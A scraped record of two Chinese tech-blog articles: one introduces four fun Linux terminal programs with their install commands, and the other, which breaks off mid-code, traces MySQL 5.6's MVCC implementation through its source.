["http://jbcdn2.b0.upaiyun.com/2018/08/caf40e93894ca408fc2b86171e34d5bb.jpg"], "title": "4 款酷炫的终端应用", "create_time": "2018/08/11", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Atolstoy,   译文出处：,Linux中国/geekpi,   ,\n,许多 Linux 用户认为在终端中工作太复杂、无聊，并试图逃避它。但这里有个改善方法 —— 四款终端下很棒的开源程序。它们既有趣又易于使用，甚至可以在你需要在命令行中工作时照亮你的生活。,\n,No More Secrets,\n,这是一个简单的命令行工具，可以重现 1992 年电影 ,Sneakers, 中所见的著名数据解密效果。该项目让你编译个 ,nms, 命令，该命令与管道数据一起使用并以混乱字符的形式打印输出。开始后，你可以按任意键，并能在输出中看到很酷的好莱坞效果的现场“解密”。,\n,\n,安装说明,\n,一个全新安装的 Fedora Workstation 系统已经包含了从源代码构建 No More Secrets 所需的一切。只需在终端中输入以下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit clone https://github.com/bartobri/no-more-secrets.git\r\ncd ./no-more-secrets\r\nmake nms\r\nmake sneakers ## Optional\r\nsudo make install\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,clone, ,https,:,//github.com/bartobri/no-more-secrets.git,cd, ,.,/,no,-,more,-,secrets,make ,nms,make ,sneakers, ,## Optional,sudo ,make ,install, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,对于那些记得原来的电影的人来说，,sneakers, 命令是一个小小的彩蛋，但主要的英雄是 ,nms,。使用管道将任何 Linux 命令重定向到 ,nms,，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsystemctl list-units --type=target | nms\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,systemctl ,list,-,units, ,--,type,=,target, ,|, ,nms, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,当文本停止闪烁，按任意键“解密”它。上面的 ,systemctl, 命令只是一个例子 —— 你几乎可以用任何东西替换它！,\n,lolcat,\n,这是一个用彩虹为终端输出着色的命令。没什么用，但是它看起来很棒！,\n,\n,安装说明,\n,lolcat, 是一个 Ruby 软件包，可从官方 Ruby Gems 托管中获得。所以，你首先需要 gem 客户端：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo dnf install -y rubygems\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,dnf ,install, ,-,y, ,rubygems, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,然后安装 ,lolcat, 本身：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngem install lolcat\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,gem ,install ,lolcat, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,再说一次，使用 ,lolcat, 命令管道任何其他命令，并在 Fedora 终端中享受彩虹（和独角兽！）。,\n,chafa,\n,\n,chafa, 是一个,命令行图像转换器和查看器,。它可以帮助你在不离开终端的情况下欣赏图像。语法非常简单：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchafa /path/to/your/image\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,chafa, ,/,path,/,to,/,your,/,image, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你可以将几乎任何类型的图像投射到 ,chafa,，包括 JPG、PNG、TIFF、BMP 或几乎任何 ImageMagick 支持的图像 – 这是 ,chafa, 用于解析输入文件的引擎。最酷的部分是 ,chafa, 还可以在你的终端内显示非常流畅的 GIF 动画！,\n,安装说明,\n,chafa, 还没有为 Fedora 打包，但从源代码构建它很容易。首先，获取必要的构建依赖项：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo dnf install -y autoconf automake libtool gtk-doc glib2-devel ImageMagick-devel\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,dnf ,install, ,-,y, ,autoconf ,automake ,libtool ,gtk,-,doc ,glib2,-,devel ,ImageMagick,-,devel, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,接下来，克隆代码或从项目的 GitHub 页面下载快照，然后 cd 到 ,chafa, 目录，这样就行了：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit clone https://github.com/hpjansson/chafa\r\n./autogen.sh\r\nmake\r\nsudo make install\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,clone, ,https,:,//github.com/hpjansson/chafa,.,/,autogen,.,sh,make,sudo ,make ,install, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,大的图像在第一次运行时可能需要一段时间处理，但 ,chafa, 会缓存你加载的所有内容。下一次运行几乎是瞬间完成的。,\n,Browsh,\n,Browsh 是完善的终端网页浏览器。它比 Lynx 更强大，当然更引人注目。 Browsh 以无头模式启动 Firefox Web 浏览器（因此你无法看到它）并在特殊 Web 扩展的帮助下将其与你的终端连接。因此，Browsh 能像 Firefox 一样呈现所有富媒体内容，只是有点像素化的风格。,\n,\n,安装说明,\n,该项目为各种 Linux 发行版提供了包，包括 Fedora。以这种方式安装：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo dnf install -y https://github.com/browsh-org/browsh/releases/download/v1.4.6/browsh_1.4.6_linux_amd64.rpm\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,dnf ,install, ,-,y, ,https,:,//github.com/browsh-org/browsh/releases/download/v1.4.6/browsh_1.4.6_linux_amd64.rpm, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,之后，启动 ,browsh, 命令并给它几秒钟加载。按 ,Ctrl+L, 将焦点切换到地址栏并开始浏览 Web，就像以前一样使用！使用 ,Ctrl+Q, 返回终端。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114268/", "url_object_id": "f3ed25a5362621eb1688aa918d122c45", "front_image_path": "full/47fa0e2c9da71e8a08f8af9c037badd5d0c473c4.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/e4ff41fe57fa22949c5909f50e5b2ca6.jpg"], "title": "MySQL多版本并发控制机制(MVCC)-源码浅析", "create_time": "2018/08/15", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,无毁的湖光-Al ,   ,\n,前言,\n,作为一个数据库爱好者，自己动手写过简单的SQL解析器以及存储引擎，但感觉还是不够过瘾。<<事务处理-概念与技术>>诚然讲的非常透彻，但只能提纲挈领，不能让你玩转某个真正的数据库。感谢cmake,能够让我在mac上用xcode去debug MySQL,从而能去领略它的各种实现细节。,\n笔者一直对数据库的隔离性很好奇，此篇博客就是我debug MySQL过程中的偶有所得。,\n(注:本文的MySQL采用的是MySQL-5.6.35版本),\n,MVCC(多版本并发控制机制),\n,隔离性也可以被称作并发控制、可串行化等。谈到并发控制首先想到的就是锁，MySQL通过使用两阶段锁的方式实现了更新的可串行化，同时为了加速查询性能，采用了MVCC(Multi Version Concurrency Control)的机制，使得不用锁也可以获取一致性的版本。,\n,Repeatable Read,\n,MySQL的通过MVCC以及(Next-Key Lock)实现了可重复读(Repeatable Read),其思想(MVCC)就是记录数据的版本变迁，通过精巧的选择不同数据的版本从而能够对用户呈现一致的结果。如下图所示:,\n,\n上图中，(A=50|B=50)的初始版本为1。,\n1.事务t1在select A时候看到的版本为1，即A=50,\n2.事务t2对A和B的修改将版本升级为2,即A=0,B=100,\n3.事务t1再此select B的时候看到的版本还是1, 即B=50,\n这样就隔离了版本的影响，A+B始终为100。,\n,Read Commit,\n,而如果不通过版本控制机制，而是读到最近提交的结果的话，则隔离级别是read commit,如下图所示:,\n,\n在这种情况下，就需要使用锁机制(例如select for update)将此A,B记录锁住，从而获得正确的一致结果,如下图所示：,\n,\n,MVCC的优势,\n,当我们要对一些数据做一些只读操作来检查一致性，例如检查账务是否对齐的操作时候，并不希望加上对性能损耗很大的锁。这时候MVCC的一致性版本就有很大的优势了。,\n,MVCC(实现机制),\n,本节就开始谈谈MVCC的实现机制,注意MVCC仅仅在纯select时有效(不包括select for update,lock in share mode等加锁操作,以及updateinsert等)。,\n,select运行栈,\n,首先我们追踪一下一条普通的查询sql在mysql源码中的运行过程,sql为(select * from test); ,\n其运行栈为:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nhandle_one_connection  MySQL的网络模型是one request one thread\r\n |-do_handle_one_connection\r\n\t|-do_command\r\n\t\t|-dispatch_command\r\n\t\t\t|-mysql_parse\t解析SQL\r\n\t\t\t\t|-mysql_execute_command\r\n\t\t\t\t\t|-execute_sqlcom_select\t执行select语句\r\n\t\t\t\t\t\t|-handle_select\r\n\t\t\t\t\t\t\t...一堆parse join 等的操作，当前并不关心\r\n\t\t\t\t\t\t\t|-*tab->read_record.read_record 读取记录\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,handle_one_connection  ,MySQL,的网络模型是,one ,request ,one ,thread, ,|,-,do_handle_one_connection,\t,|,-,do_command,\t\t,|,-,dispatch_command,\t\t\t,|,-,mysql,_,parse,\t,解析,SQL,\t\t\t\t,|,-,mysql_execute_command,\t\t\t\t\t,|,-,execute_sqlcom,_,select,\t,执行,select,语句,\t\t\t\t\t\t,|,-,handle,_,select,\t\t\t\t\t\t\t,.,.,.,一堆,parse ,join, ,等的操作，当前并不关心,\t\t\t\t\t\t\t,|,-,*,tab,->,read_record,.,read,_,record, ,读取记录, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,由于mysql默认隔离级别是repeatable_read(RR),所以read_record重载为 rr_sequential(当前我们并不关心select通过index扫描出row之后再通过condition过滤的过程)。继续追踪:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nread_record\r\n |-rr_sequential\r\n\t|-ha_rnd_next\r\n\t\t|-ha_innobase::rnd_next 这边就已经到了innodb引擎了\r\n\t\t\t|-general_fetch\r\n\t\t\t\t|-row_search_for_mysql\r\n\t\t\t\t\t|-lock_clust_rec_cons_read_sees 这边就是判断并选择版本的地方\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,read_record, ,|,-,rr_sequential,\t,|,-,ha_rnd_next,\t\t,|,-,ha_innobase,::,rnd,_,next, ,这边就已经到了,innodb,引擎了,\t\t\t,|,-,general_fetch,\t\t\t\t,|,-,row_search_for_mysql,\t\t\t\t\t,|,-,lock_clust_rec_cons_read,_,sees, ,这边就是判断并选择版本的地方, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,让我们看下该函数内部:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nbool lock_clust_rec_cons_read_sees(const rec_t* rec /*由innodb扫描出来的一行*/,....){\r\n\t...\r\n\t// 从当前扫描的行中获取其最后修改的版本trx_id(事务id)\r\n\ttrx_id = row_get_rec_trx_id(rec, index, offsets);\r\n\t// 通过参数(一致性快照视图和事务id)决定看到的行快照\r\n\treturn(read_view_sees_trx_id(view, trx_id));\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,bool, ,lock_clust_rec_cons_read_sees,(,const, ,rec_t*, ,rec, ,/*由innodb扫描出来的一行*/,,,.,.,.,.,),{,\t,.,.,.,\t,// 从当前扫描的行中获取其最后修改的版本trx_id(事务id),\t,trx_id, ,=, ,row_get_rec_trx_id,(,rec,,, ,index,,, ,offsets,),;,\t,// 通过参数(一致性快照视图和事务id)决定看到的行快照,\t,return,(,read_view_sees_trx_id,(,view,,, ,trx_id,),),;,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,read_view的创建过程,\n,我们先关注一致性视图的创建过程,我们先看下read_view结构:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nstruct read_view_t{\r\n\t// 由于是逆序排列，所以low/up有所颠倒\r\n\t// 能看到当前行版本的高水位标识,> low_limit_id皆不能看见\r\n\ttrx_id_t\tlow_limit_id;\r\n\t// 能看到当前行版本的低水位标识,< up_limit_id皆能看见\r\n\ttrx_id_t\tup_limit_id;\r\n\t// 当前活跃事务(即未提交的事务)的数量\r\n\tulint\t\tn_trx_ids;\r\n\t// 以逆序排列的当前获取活跃事务id的数组\r\n\t// 其up_limit_id<tx_id<low_limit_id\r\n\ttrx_id_t*\ttrx_ids;\t\r\n\t// 创建当前视图的事务id\r\n\ttrx_id_t\tcreator_trx_id;\r\n\t// 事务系统中的一致性视图链表\r\n\tUT_LIST_NODE_T(read_view_t) view_list;\r\n};,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,struct, ,read_view_t,{,\t,// 由于是逆序排列，所以low/up有所颠倒,\t,// 能看到当前行版本的高水位标识,> low_limit_id皆不能看见,\t,trx_id_t\t,low_limit_id,;,\t,// 能看到当前行版本的低水位标识,< up_limit_id皆能看见,\t,trx_id_t\t,up_limit_id,;,\t,// 当前活跃事务(即未提交的事务)的数量,\t,ulint\t\t,n_trx_ids,;,\t,// 以逆序排列的当前获取活跃事务id的数组,\t,// 其up_limit_id<tx_id<low_limit_id,\t,trx_id_t*,\t,trx_ids,;,\t,\t,// 创建当前视图的事务id,\t,trx_id_t\t,creator_trx_id,;,\t,// 事务系统中的一致性视图链表,\t,UT_LIST_NODE_T,(,read_view_t,), ,view_list,;,},;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,然后通过debug，发现创建read_view结构也是在上述的rr_sequential中操作的，继续跟踪调用栈:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nrr_sequential\r\n |-ha_rnd_next\r\n \t|-rnd_next\r\n \t\t|-index_first 在start_of_scan为true时候走当前分支index_first\r\n \t\t\t|-index_read\r\n \t\t\t\t|-row_search_for_mysql\r\n \t\t\t\t\t|-trx_assign_read_view\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,rr_sequential, ,|,-,ha_rnd_next, \t,|,-,rnd_next, \t\t,|,-,index,_,first, ,在,start_of,_,scan为,true,时候走当前分支,index_first, \t\t\t,|,-,index_read, \t\t\t\t,|,-,row_search_for_mysql, \t\t\t\t\t,|,-,trx_assign_read,_,view, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我们看下row_search_for_mysql里的一个分支:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nrow_search_for_mysql:\r\n// 这边只有select不加锁模式的时候才会创建一致性视图\r\nelse if (prebuilt->select_lock_type == LOCK_NONE) {\t\t// 创建一致性视图\r\n\t\ttrx_assign_read_view(trx);\r\n\t\tprebuilt->sql_stat_start = FALSE;\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,row_search_for_mysql,:,// 这边只有select不加锁模式的时候才会创建一致性视图,else, ,if, ,(,prebuilt,->,select_lock_type, ,==, ,LOCK_NONE,), ,{,\t\t,// 创建一致性视图,\t\t,trx_assign_read_view,(,trx,),;,\t\t,prebuilt,->,sql_stat_start, ,=, ,FALSE,;,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上面的注释就是select for update(in share model)不会走MVCC的原因。让我们进一步分析trx_assign_read_view函数:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ntrx_assign_read_view\r\n |-read_view_open_now\r\n \t|-read_view_open_now_low\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,trx_assign_read_view, ,|,-,read_view_open_now, \t,|,-,read_view_open_now,_,low, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,好了，终于到了创建read_view的主要阶段,主要过程如下图所示:,\n,\n,代码过程为:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nstatic read_view_t* read_view_open_now_low(trx_id_t\tcr_trx_id,mem_heap_t*\theap)\r\n{\r\n\tread_view_t*\tview;\r\n\t// 当前事务系统中最大的事务id设置为low_limit_no\r\n\tview->low_limit_no = trx_sys->max_trx_id;\r\n\tview->low_limit_id = view->low_limit_no;\r\n\t// CreateView构造函数，会将非当前事务和已经在内存中提交的事务给剔除，即判断条件为\r\n\t// trx->id != m_view->creator_trx_id&& !trx_state_eq(trx, TRX_STATE_COMMITTED_IN_MEMORY)的\r\n\t// 才加入当前视图列表\r\n\tut_list_map(trx_sys->rw_trx_list, &trx_t::trx_list, CreateView(view));\r\n\tif (view->n_trx_ids > 0) {\r\n\t\t// 将当前事务系统中的最小id设置为up_limit_id,因为是逆序排列\r\n\t\tview->up_limit_id = view->trx_ids[view->n_trx_ids - 1];\r\n\t} else {\r\n\t\t// 如果当前没有非当前事务之外的活跃事务，则设置为low_limit_id\r\n\t\tview->up_limit_id = view->low_limit_id;\r\n\t}\r\n\t// 忽略purge事务，purge时，当前事务id是0\r\n\tif (cr_trx_id > 0) {\r\n\t\tread_view_add(view);\r\n\t}\r\n\t// 返回一致性视图\r\n\treturn(view);\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,static, ,read_view_t*, ,read_view_open_now_low,(,trx_id_t\t,cr_trx_id,,,mem_heap_t*,\t,heap,),{,\t,read_view_t*,\t,view,;,\t,// 当前事务系统中最大的事务id设置为low_limit_no,\t,view,->,low_limit_no, ,=, ,trx_sys,->,max_trx_id,;,\t,view,->,low_limit_id, ,=, ,view,->,low_limit_no,;,\t,// CreateView构造函数，会将非当前事务和已经在内存中提交的事务给剔除，即判断条件为,\t,// trx->id != m_view->creator_trx_id&& !trx_state_eq(trx, TRX_STATE_COMMITTED_IN_MEMORY)的,\t,// 才加入当前视图列表,\t,ut_list_map,(,trx_sys,->,rw_trx_list,,, ,&,trx_t,::,trx_list,,, ,CreateView,(,view,),),;,\t,if, ,(,view,->,n_trx_ids, ,>, ,0,), ,{,\t\t,// 将当前事务系统中的最小id设置为up_limit_id,因为是逆序排列,\t\t,view,->,up_limit_id, ,=, ,view,->,trx_ids,[,view,->,n_trx_ids, ,-, ,1,],;,\t,}, ,else, ,{,\t\t,// 如果当前没有非当前事务之外的活跃事务，则设置为low_limit_id,\t\t,view,->,up_limit_id, ,=, ,view,->,low_limit_id,;,\t,},\t,// 忽略purge事务，purge时，当前事务id是0,\t,if, ,(,cr_trx_id, ,>, ,0,), ,{,\t\t,read_view_add,(,view,),;,\t,},\t,// 返回一致性视图,\t,return,(,view,),;,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,行版本可见性:,\n,由上面的lock_clust_rec_cons_read_sees可知,行版本可见性由read_view_sees_trx_id函数判断:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n/*********************************************************************//**\r\nChecks if a read view sees the specified transaction.\r\n<a href='http://www.jobbole.com/members/wx1409399284'>@return</a>\ttrue if sees */\r\nUNIV_INLINE\r\nbool\r\nread_view_sees_trx_id(\r\n/*==================*/\r\n\tconst read_view_t*\tview,\t/*!< in: read view */\r\n\ttrx_id_t\t\ttrx_id)\t/*!< in: trx id */\r\n{\r\n\tif (trx_id < view->up_limit_id) {\r\n\r\n\t\treturn(true);\r\n\t} else if (trx_id >= view->low_limit_id) {\r\n\r\n\t\treturn(false);\r\n\t} else {\r\n\t\tulint\tlower = 0;\r\n\t\tulint\tupper = view->n_trx_ids - 1;\r\n\r\n\t\tut_a(view->n_trx_ids > 0);\r\n\r\n\t\tdo {\r\n\t\t\tulint\t\tmid\t= (lower + upper) >> 1;\r\n\t\t\ttrx_id_t\tmid_id\t= view->trx_ids[mid];\r\n\r\n\t\t\tif (mid_id == trx_id) {\r\n\t\t\t\treturn(FALSE);\r\n\t\t\t} else if (mid_id < trx_id) {\r\n\t\t\t\tif (mid > 0) {\r\n\t\t\t\t\tupper = mid - 1;\r\n\t\t\t\t} else {\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t} else {\r\n\t\t\t\tlower = mid + 1;\r\n\t\t\t}\r\n\t\t} while (lower <= upper);\r\n\t}\r\n\r\n\treturn(true);\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,/*********************************************************************/,/**,Checks if a read view sees the specified transaction.,<a href='http://www.jobbole.com/members/wx1409399284'>@return</a>\ttrue if sees */,UNIV_INLINE,bool,read_view_sees_trx_id,(,/*==================*/,\t,const, ,read_view_t*,\t,view,,,\t,/*!< in: read view */,\t,trx_id_t\t\t,trx_id,),\t,/*!< in: trx id */,{,\t,if, ,(,trx_id, ,<, ,view,->,up_limit_id,), ,{, ,\t\t,return,(,true,),;,\t,}, ,else, ,if, ,(,trx_id, ,>=, ,view,->,low_limit_id,), ,{, ,\t\t,return,(,false,),;,\t,}, ,else, ,{,\t\t,ulint\t,lower, ,=, ,0,;,\t\t,ulint\t,upper, ,=, ,view,->,n_trx_ids, ,-, ,1,;, ,\t\t,ut_a,(,view,->,n_trx_ids, ,>, ,0,),;, ,\t\t,do, ,{,\t\t\t,ulint\t\t,mid,\t,=, ,(,lower, ,+, ,upper,), ,>>, ,1,;,\t\t\t,trx_id_t\t,mid_id,\t,=, ,view,->,trx_ids,[,mid,],;, ,\t\t\t,if, ,(,mid_id, ,==, ,trx_id,), ,{,\t\t\t\t,return,(,FALSE,),;,\t\t\t,}, ,else, ,if, ,(,mid_id, ,<, ,trx_id,), ,{,\t\t\t\t,if, ,(,mid, ,>, ,0,), ,{,\t\t\t\t\t,upper, ,=, ,mid, ,-, ,1,;,\t\t\t\t,}, ,else, ,{,\t\t\t\t\t,break,;,\t\t\t\t,},\t\t\t,}, ,else, ,{,\t\t\t\t,lower, ,=, ,mid, ,+, ,1,;,\t\t\t,},\t\t,}, ,while, ,(,lower, ,<=, ,upper,),;,\t,}, ,\t,return,(,true,),;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,其实上述函数就是一个二分法，read_view其实保存的是当前活跃事务的所有事务id,如果当前行版本对应修改的事务id不在当前活跃事务里面的话，就返回true,表示当前版本可见，否则就是不可见,如下图所示。,\n,\n接上述lock_clust_rec_cons_read_sees的返回:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nif (UNIV_LIKELY(srv_force_recovery < 5)\r\n\t\t\t    && !lock_clust_rec_cons_read_sees(\r\n\t\t\t\t    rec, index, offsets, trx->read_view)){\r\n\t// 当前处理的是当前版本不可见的情况\r\n\t// 通过undolog来返回到一致的可见版本\r\n\terr = row_sel_build_prev_vers_for_mysql(\r\n\t\t\t\t\ttrx->read_view, clust_index,\r\n\t\t\t\t\tprebuilt, rec, &offsets, &heap,\r\n\t\t\t\t\t&old_vers, &mtr);\t\t\t    \r\n} else{\r\n\t// 可见，然后返回\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,if, ,(,UNIV_LIKELY,(,srv_force_recovery, ,<, ,5,),\t\t\t    ,&&, ,!,lock_clust_rec_cons_read_sees,(,\t\t\t\t    ,rec,,, ,index,,, ,offsets,,, ,trx,->,read_view,),),{,\t,// 当前处理的是当前版本不可见的情况,\t,// 通过undolog来返回到一致的可见版本,\t,err, ,=, ,row_sel_build_prev_vers_for_mysql,(,\t\t\t\t\t,trx,->,read_view,,, ,clust_index,,,\t\t\t\t\t,prebuilt,,, ,rec,,, ,&,offsets,,, ,&,heap,,,\t\t\t\t\t,&,old_vers,,, ,&,mtr,),;,\t\t\t    ,}, ,else,{,\t,// 可见，然后返回,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,undolog搜索可见版本的过程,\n,我们现在考察一下row_sel_build_prev_vers_for_mysql函数:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nrow_sel_build_prev_vers_for_mysql\r\n |-row_vers_build_for_consistent_read\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,row_sel_build_prev_vers_for_mysql, ,|,-,row_vers_build_for_consistent,_,read, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,主要是调用了row_ver_build_for_consistent_read方法返回可见版本:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndberr_t 